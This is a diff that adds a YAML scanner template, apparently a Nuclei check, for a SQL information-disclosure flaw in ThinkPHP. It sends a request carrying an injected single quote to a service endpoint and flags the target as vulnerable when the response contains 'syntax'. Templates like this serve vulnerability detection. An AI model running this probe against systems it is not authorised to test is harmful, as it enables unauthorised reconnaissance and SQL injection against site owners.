@@ -1,0 +1,22 @@
+id: thinkphp_multi_sql_leak_4
+
+info:
+  name: "ThinkPHP 多数据库查询信息泄露漏洞"
+  author: 0dayPoc
+  severity: high
+  description: |-
+
+    The application exhibits a SQL information exposure flaw in its multi-database query handling mechanism. Improper validation of database connection parameters allows remote attackers to infer sensitive database structure details through error message analysis. This vulnerability enables unauthorized data enumeration and schema reconnaissance without requiring authentication credentials.
+  tags: ThinkPHP
+
+http:
+- raw:
+  - |
+    GET /index.php?s=/home/service/index/id/1%27 HTTP/1.1
+    Host: {{Hostname}}
+  matchers-condition: and
+  matchers:
+  - type: word
+    part: body
+    words:
+    - 'syntax'
